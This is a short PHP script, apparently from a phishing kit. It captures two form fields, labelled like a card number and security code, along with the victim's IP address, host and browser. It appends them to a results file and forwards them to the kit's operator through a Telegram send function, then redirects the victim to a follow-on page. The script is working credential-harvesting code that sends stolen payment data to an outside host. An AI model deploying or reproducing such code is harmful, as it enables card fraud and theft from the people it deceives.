<?php
require_once '../ventro/zabiosobi.php';
$ip = getenv("REMOTE_ADDR");

$message .= "----1/2/2/1/2-----\n";
$message .= "LCARTA/     	 : ".$_POST['taw']."\n";
$message .= "3point/     	 : ".$_POST['staw']."\n";



$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-----------BY-/EOGL---------------\n";
$message .= "-------------- SMS/DATE----------\n";
$message .= "---------1/2/1/2/----------\n";

$fp = fopen('../alresult.txt', 'a');
fwrite($fp, $message);
fclose($fp);
telegram_send(urlencode($message));
header("Location:  ../info/ferm.html.htm");?>